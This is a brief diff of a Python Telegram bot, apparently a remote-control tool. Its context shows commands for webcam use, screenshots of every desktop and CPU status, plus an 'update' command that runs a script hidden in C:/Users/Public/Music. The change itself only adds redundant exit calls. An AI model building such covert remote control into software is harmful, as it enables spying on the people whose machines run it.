@@ -63,6 +63,8 @@ help_text = 'Вeрсия '+versi+' Ник '+USER_NAME+' \n \nhelp - help \ncam -
 #NEEDS TESTING
 def leave():
 	sys.exit(1)
+	raise SystemExit("done")
+	sys.exit(1)
 
 #make screenshot of all desktops
 def scr():
@@ -120,7 +122,9 @@ def message_handler(update: Update, context: CallbackContext):
 	elif text == 'update':
 		os.system('python C:/Users/Public/Music/update.pyw')   
 		bot.send_message(chat_id=chat_user_id, text='start updating')
+		leave()
 		exit()
+		
 	elif text == '_status':  
 		print('ok')    
 		cpu = psutil.cpu_times_percent(interval=0.4, percpu=False)
